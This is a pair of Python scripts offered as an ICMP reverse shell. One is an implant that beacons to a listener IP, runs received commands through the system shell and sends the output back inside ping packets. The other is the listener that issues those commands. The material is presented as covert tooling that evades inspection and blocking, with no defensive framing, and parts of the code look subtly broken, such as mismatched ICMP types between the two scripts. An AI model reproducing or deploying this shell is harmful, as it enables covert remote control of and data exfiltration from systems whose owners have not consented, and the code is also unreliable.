'''Change from previous: Hides commands and responses inside ICMP echo packets (ping traffic). Almost never inspected or blocked.'''
#!/usr/bin/env python3
# ICMP REVERSE SHELL - COMMANDS HIDDEN IN PING PACKETS

import os
import sys
import socket
import struct
import subprocess
import time
import threading
import select
import platform

# ICMP header structure
class ICMPPacket:
    def __init__(self):
        self.type = 8  # Echo request
        self.code = 0
        self.checksum = 0
        self.id = os.getpid() & 0xFFFF
        self.seq = 1

class ICMPShell:
    def __init__(self, target_ip):
        self.target_ip = target_ip  # Your listener IP
        self.socket = None
        self.running = True
        self.seq_num = 1
        self.buffer = ""
        
    def create_socket(self):
        """Create raw socket for ICMP (requires root/Admin)"""
        try:
            if platform.system() == "Windows":
                # Windows raw socket setup
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            else:
                # Unix raw socket
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            return True
        except PermissionError:
            print("[-] Requires root/Administrator privileges")
            return False
        except Exception as e:
            print(f"[-] Socket error: {e}")
            return False
    
    def checksum(self, data):
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            total += word
        
        total = (total >> 16) + (total & 0xFFFF)
        total = ~total & 0xFFFF
        return total
    
    def create_icmp_packet(self, payload=""):
        """Build ICMP packet with hidden data"""
        icmp = ICMPPacket()
        icmp.seq = self.seq_num
        self.seq_num += 1
        
        # Encode payload in packet data
        packet_data = payload.encode()[:56]  # Limit size
        header = struct.pack('bbHHh', icmp.type, icmp.code, icmp.checksum, icmp.id, icmp.seq)
        
        # Calculate checksum with data included
        icmp.checksum = self.checksum(header + packet_data)
        header = struct.pack('bbHHh', icmp.type, icmp.code, socket.htons(icmp.checksum), icmp.id, icmp.seq)
        
        return header + packet_data
    
    def send_ping(self, payload=""):
        """Send ICMP packet with hidden command/response"""
        try:
            packet = self.create_icmp_packet(payload)
            self.socket.sendto(packet, (self.target_ip, 0))
            return True
        except:
            return False
    
    def receive_ping(self, timeout=2):
        """Listen for ICMP packets containing commands"""
        try:
            self.socket.settimeout(timeout)
            packet, addr = self.socket.recvfrom(1024)
            
            # Extract ICMP header (20 bytes IP header + 8 bytes ICMP header)
            icmp_header = packet[20:28]
            icmp_type = struct.unpack('bb', icmp_header[:2])[0]
            
            # Only process echo requests (type 8)
            if icmp_type == 8:
                data = packet[28:].decode(errors='ignore').strip('\x00')
                if data:
                    return data
            return None
        except socket.timeout:
            return None
        except:
            return None
    
    def execute_command(self, command):
        """Run command and return output"""
        try:
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"[DIR] {os.getcwd()}"
            
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result[:100]  # ICMP size limit
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def run(self):
        """Main loop - ping tunneling"""
        if not self.create_socket():
            return
        
        # Initial beacon
        self.send_ping(f"[CONNECT] {platform.node()} connected")
        
        while self.running:
            # Listen for command
            cmd = self.receive_ping(timeout=3)
            
            if cmd and cmd.lower() != 'none':
                if cmd.lower() == 'exit':
                    self.send_ping("[EXIT] Closing connection")
                    break
                
                # Execute and send response via ping
                output = self.execute_command(cmd)
                self.send_ping(f"[OUT] {output}")
            
            # Heartbeat - let listener know we're alive
            self.send_ping("[HEARTBEAT]")
            time.sleep(2)

if __name__ == "__main__":
    LISTENER_IP = "192.168.1.100"  # CHANGE THIS
    shell = ICMPShell(LISTENER_IP)
    shell.run()



#Listener setup (Python ICMP sniffer):
#!/usr/bin/env python3
# ICMP LISTENER - RECEIVES PINGS, SENDS COMMANDS

import socket
import struct
import time
import threading

class ICMPListener:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        self.target = None
        self.commands = ["whoami", "ipconfig"]
        self.cmd_index = 0
    
    def checksum(self, data):
        if len(data) % 2:
            data += b'\x00'
        total = 0
        for i in range(0, len(data), 2):
            total += (data[i] << 8) + data[i+1]
        total = (total >> 16) + (total & 0xFFFF)
        return ~total & 0xFFFF
    
    def send_command(self, target_ip, command):
        # Send command as ICMP echo reply
        icmp_type = 0  # Echo reply
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = 12345
        icmp_seq = 1
        
        header = struct.pack('bbHHh', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        data = command.encode()
        
        icmp_checksum = self.checksum(header + data)
        header = struct.pack('bbHHh', icmp_type, icmp_code, socket.htons(icmp_checksum), icmp_id, icmp_seq)
        
        packet = header + data
        self.sock.sendto(packet, (target_ip, 0))
    
    def listen(self):
        print("[*] ICMP Listener started. Waiting for connections...")
        while True:
            packet, addr = self.sock.recvfrom(1024)
            
            # Parse ICMP
            ip_header = packet[0:20]
            icmp = packet[20:28]
            data = packet[28:].decode(errors='ignore').strip('\x00')
            
            icmp_type = struct.unpack('b', icmp[0:1])[0]
            
            if icmp_type == 8:  # Echo request
                source = addr[0]
                if not self.target:
                    self.target = source
                    print(f"[+] Target connected: {source}")
                
                if data.startswith('[OUT]'):
                    print(f"[OUTPUT] {data[5:]}")
                elif data.startswith('[CONNECT]'):
                    print(f"[+] {data}")
                elif data == '[HEARTBEAT]':
                    # Send next command on heartbeat
                    if self.cmd_index < len(self.commands):
                        cmd = self.commands[self.cmd_index]
                        print(f"[>] Sending command: {cmd}")
                        self.send_command(self.target, cmd)
                        self.cmd_index += 1

if __name__ == "__main__":
    listener = ICMPListener()
    listener.listen()